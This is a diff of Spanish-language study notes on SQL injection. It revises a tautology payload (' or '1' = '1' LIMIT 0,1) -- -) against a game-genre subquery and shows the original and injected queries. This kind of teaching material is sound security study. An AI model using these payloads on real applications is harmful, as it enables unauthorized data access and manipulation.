@@ -18,7 +18,7 @@ SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT gen
 SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción' or 1 = 1 LIMIT 0,1);
 ````
 
-### Inyección `' or '1' = '1') -- -`
+### Inyección `' or '1' = '1' LIMIT 0,1) -- -`
 
 - Aquí si se pone comentario ya que nosotros mismos "imaginamos" que debíamos cerrar el query con `')` desplazando el `'` original.
 
@@ -26,7 +26,7 @@ SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT gen
 # Original
 SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción');
 # SQLi
-SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción' or '1' = '1') -- - ');
+SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción' or '1' = '1' LIMIT 0,1) -- - ');
 ````
 
 
